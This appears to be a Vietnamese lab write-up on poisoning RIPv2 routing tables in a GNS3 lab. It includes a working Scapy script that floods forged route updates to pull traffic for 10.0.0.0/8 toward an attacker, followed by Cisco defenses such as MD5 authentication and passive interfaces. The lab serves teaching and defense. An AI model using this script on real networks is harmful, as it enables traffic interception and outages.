# ☠️ Lab: RIPv2 Route Poisoning & Fake Route Injection

## 🎯 Mục tiêu bài Lab
RIP (Routing Information Protocol) là một giao thức định tuyến dạng Vector khoảng cách (Distance-Vector) khá cũ. Do bản chất đơn giản, nó rất dễ bị tấn công nếu không được cấu hình bảo mật. Kẻ tấn công có thể gửi các bản cập nhật RIP giả mạo với Metric (số Hop) nhỏ hơn để "dụ" lưu lượng mạng chuyển hướng qua máy của mình, tạo tiền đề cho tấn công Man-in-the-Middle (MitM) hoặc DoS.

## ⚙️ Môi trường & Công cụ
* **Nền tảng:** GNS3
* **Thiết bị:** Cisco Routers chạy RIPv2
* **Máy tấn công:** Kali Linux
* **Công cụ:** Yersinia, Scapy (Python)

## 🚀 Kịch bản tấn công (Attack Scenario)

### Kỹ thuật: Inject Fake RIP Route
Máy tấn công đóng vai trò là một "Router giả mạo", liên tục gửi các gói tin RIPv2 Response quảng bá một mạng mục tiêu (ví dụ `10.0.0.0/8`) với Metric là `1` (Rất gần). Các Router hợp lệ khi nhận được bản cập nhật này sẽ tin tưởng và lưu vào bảng định tuyến do Metric này tốt hơn các Metric thực tế.

**Thực thi bằng Python/Scapy:**
```python
from scapy.all import *

# Tạo gói tin UDP port 520 (RIP)
ip = IP(src="192.168.1.50", dst="224.0.0.9") # 224.0.0.9 là địa chỉ Multicast RIPv2
udp = UDP(sport=520, dport=520)

# Xây dựng cấu trúc RIPv2 Response (Command 2) quảng bá route giả
rip_entry = RIPEntry(AF="IPv4", RouteTag=0, addr="10.0.0.0", mask="255.0.0.0", nextHop="192.168.1.50", metric=1)
rip = RIP(cmd=2, version=2) / rip_entry

# Gửi gói tin định kỳ
pkt = ip / udp / rip
send(pkt, inter=5, loop=1)
```
*Hậu quả: Toàn bộ traffic đi đến dải mạng `10.0.0.0/8` sẽ bị định tuyến sai lệch về phía máy tấn công (`192.168.1.50`).*

## 🛡️ Biện pháp phòng thủ (Mitigation)
Tương tự như OSPF, RIP cũng cần được cô lập và xác thực cẩn thận:

1. **Bật xác thực RIPv2 MD5:**
   ```bash
   Router(config)# key chain RIP_KEY
   Router(config-keychain)# key 1
   Router(config-keychain-key)# key-string [Mật_Khẩu]
   
   Router(config)# interface [Cổng_Chạy_RIP]
   Router(config-if)# ip rip authentication key-chain RIP_KEY
   Router(config-if)# ip rip authentication mode md5
   ```

2. **Cấu hình Passive Interface:** Tránh phát sóng (Broadcast/Multicast) thông tin định tuyến xuống mạng LAN của người dùng.
   ```bash
   Router(config)# router rip
   Router(config-router)# passive-interface [Cổng_LAN]
   ```

3. **Áp dụng Route Filtering (ACL / Prefix-List):** Chỉ cho phép nhận các bản cập nhật định tuyến cho những dải mạng cụ thể, lọc bỏ các mạng không mong muốn.

---
*Project by Nguyen Gia Bao (Hoa Bảo Lục) - 2026*